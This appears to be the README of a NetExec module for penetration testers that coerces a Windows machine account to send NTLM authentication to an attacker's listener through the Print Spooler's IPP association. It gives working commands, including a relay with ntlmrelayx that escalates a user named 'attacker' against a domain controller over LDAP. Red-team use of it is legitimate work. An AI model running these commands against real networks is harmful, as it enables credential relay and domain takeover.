# Coerce IPP (NetExec Module)

A [NetExec](https://github.com/Pennyw0rth/NetExec) module that coerces a Windows
machine account into authenticating over HTTP (NTLM) to a listener you control.

It is a remote port of the [BOF-coerce-ipp](https://github.com/sup3rDav3/IPP)
technique, repackaged so it can be run straight from NetExec instead of as a
Beacon Object File.

> ⚠️ **Authorized use only.** This module is intended for penetration testing and
> red-team engagements on systems you own or have explicit written permission to
> test. Using it against systems without authorization is illegal.

---

## How it works

1. The module opens an **Xcv handle** to the `WSD Port` monitor over
   **MS-RPRN** (the Print Spooler's remote protocol).
2. It then calls **`AssocIppDirected`** with an `ipp://` URI pointing at your
   listener.
3. The target's **machine account** makes an outbound HTTP connection to that
   URI and authenticates with **NTLM** — which you capture or relay.

In short: trigger authentication coercion through the Print Spooler's IPP
association, without needing a Beacon on the host.

---

## Requirements

- **Administrative (or equivalent) rights** on the target.
  Standard domain users cannot open the `Xcv` handle, so the coercion will fail
  for them.
- A working NetExec installation.
- A listener to receive the incoming NTLM authentication (e.g. `ntlmrelayx`,
  `Responder`, or a custom HTTP listener).

---

## Installation

Drop the module into your NetExec modules directory:

```bash
# Default location on Linux
cp coerce_ipp.py ~/.nxc/modules/
```

NetExec will pick it up automatically on the next run. Confirm it's loaded with:

```bash
nxc smb -L | grep coerce_ipp
```

---

## Usage

Run it through NetExec's **SMB** protocol with `-M coerce_ipp`:

```bash
nxc smb <target> -u <user> -p <password> -M coerce_ipp -o LISTENER=<your-ip>
```

### Options

| Option     | Required | Description                              |
| ---------- | :------: | ---------------------------------------- |
| `LISTENER` |   Yes    | IP address of your listener.             |
| `PORT`     |    No    | Custom listener port.                    |
| `PATH`     |    No    | Custom request path for the `ipp://` URI.|

### Examples

Basic coercion to a listener:

```bash
nxc smb 10.10.10.5 -u admin -p 'Passw0rd!' -M coerce_ipp -o LISTENER=10.10.10.1
```

With a custom port and path:

```bash
nxc smb 10.10.10.5 -u admin -p 'Passw0rd!' -M coerce_ipp \
    -o LISTENER=10.10.10.1 PORT=8080 PATH=/relay
```

Typical relay workflow — start your relay first, then coerce:

```bash
# Terminal 1 — set up the relay
ntlmrelayx.py -t ldap://dc01.corp.local --escalate-user attacker

# Terminal 2 — trigger the coercion
nxc smb 10.10.10.5 -u admin -p 'Passw0rd!' -M coerce_ipp -o LISTENER=10.10.10.1
```

---

## Credits

- Original technique: [BOF-coerce-ipp](https://github.com/sup3rDav3/IPP)
- Built as a module for [NetExec](https://github.com/Pennyw0rth/NetExec)

